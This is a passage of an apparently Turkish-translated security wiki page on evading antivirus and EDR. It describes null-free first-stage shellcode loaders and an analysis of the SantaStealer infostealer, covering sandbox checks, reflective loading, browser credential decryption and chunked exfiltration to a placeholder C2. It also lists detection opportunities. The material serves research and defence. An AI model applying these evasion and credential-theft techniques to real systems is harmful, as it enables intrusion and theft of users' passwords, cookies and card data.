Her üç carrier da **string veya string benzeri veridir**; bu nedenle `0x00` içeren raw payload, transfer sırasında kesilir. Pratik bir workaround, constant'ları runtime sırasında yeniden oluşturan ve ardından arbitrary bir second stage yükleyen **null-free first stage** kullanmaktır.

Basit bir pattern, XOR tabanlı constant synthesis'tir:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack string'leri, API argümanlarını, DLL path'lerini veya ikinci aşama shellcode loader'ını oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'ine push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` register'larını sabit değerlere veya `RSP`-relative pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte aligned** tutmak

Daha sonra ikinci aşama stack'ten bir `PAGE_READWRITE` allocation'ına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` durumuna geçirilebilir ve buraya jump edilebilir; böylece doğrudan RWX allocation kullanılmaz.

### Detection fikirleri

Yazarların belirttiği iyi hunting fırsatları:

- **process-parameter pages** üzerinde `VirtualProtectEx` / `NtProtectVirtualMemory` ile executable protection uygulanması
- bu protection değişikliğinin ardından `SetThreadContext` / `NtSetContextThread` kullanılması
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için remote read işlemleri
- process creation sırasında alışılmadık derecede uzun / yüksek entropy değerlerine sahip `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved`

### Notlar

- P3, tek başına tam bir execution primitive değil, **cross-process transfer trick**'idir: kopyalanan parameter'ın hâlâ execute-permission değişikliğine ve execution redirection method'una ihtiyacı vardır.
- `RtlCreateProcessReflection` / Dirty Vanity, `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere dahili olarak ulaştığı için yazarlar tarafından değerlendirildi ancak reddedildi.

## Fileless Evasion ve Credential Theft için SantaStealer Tradecraft

SantaStealer (aka BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve credential access tekniklerini tek bir workflow içinde nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Keyboard layout gating ve sandbox delay

- Bir config flag'i (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla kurulu keyboard layout'larını enumerate eder. Cyrillic bir layout bulunursa sample, boş bir `CIS` marker'ı bırakır ve stealer'ları çalıştırmadan terminate olur; böylece hariç tutulan locale'lerde hiçbir zaman detonate olmazken bir hunting artifact bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A, process listesini tarar, her adı özel bir rolling checksum ile hash'ler ve bunu debugger/sandbox blocklist'leriyle karşılaştırır; checksum'ı bilgisayar adı üzerinde de tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, sistem özelliklerini inceler (process-count floor, yakın zamanda gerçekleşmiş uptime), VirtualBox additions'ı tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping'i tespit etmek üzere sleep işlemleri çevresinde timing kontrolleri gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi sonlandırır.

### Fileless helper + double ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium credential helper barındırır; fileless mode, import'ları/relocation'ları kendisi çözer, böylece helper artifact'leri yazılmaz.
- Bu helper, ikinci aşama DLL'i ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32-byte key + 12-byte nonce). Her iki geçişten sonra blob'u reflectively load eder (`LoadLibrary` kullanılmaz) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium browser'a inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption key'lerini devralır ve ABE hardening'e rağmen SQLite database'lerinden password'leri/cookie'leri/credit card'ları doğrudan decrypt eder.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer table'ını iterate eder ve etkin her modül için (Telegram, Discord, Steam, screenshots, documents, browser extensions vb.) bir thread oluşturur. Her thread sonuçları paylaşılan buffer'lara yazar ve yaklaşık 45 saniyelik join window sonrasında file count bilgisini bildirir.
- Tamamlandığında her şey, statically linked `miniz` library kullanılarak `%TEMP%\\Log.zip` olarak zip'lenir. Ardından `ThreadPayload1` 15 saniye sleep eder ve arşivi HTTP POST üzerinden `http://<C2>:6767/upload` adresine 10 MB'lık chunk'lar hâlinde stream eder; bir browser'ın `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) spoof eder. Her chunk `User-Agent: upload`, `auth: <build_id>`, isteğe bağlı `w: <campaign_tag>` ekler; son chunk ise C2'nin reassembly işleminin tamamlandığını anlaması için `complete: true` ekler.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, malware için artık ücretsiz geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust'ınıza güvenmeli misiniz? Zscaler posture check'lerini bypass etme](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell'den önce: Storm-2603'ün önceki ransomware operasyonlarını inceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Export'ları kötüye kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR'lara karşı koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect tekniğiyle Windows Defender'ın protective shell'ini kırma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain'ın altında: RAT'ten builder'a, coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware'i yenme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace ile Adaptix'i uyutma](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet Etw'nizi gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop'ı kötüye kullanma: Uygulamalı bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender'ın remediation driver'ını kernel operation primitive olarak silahlandırma](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
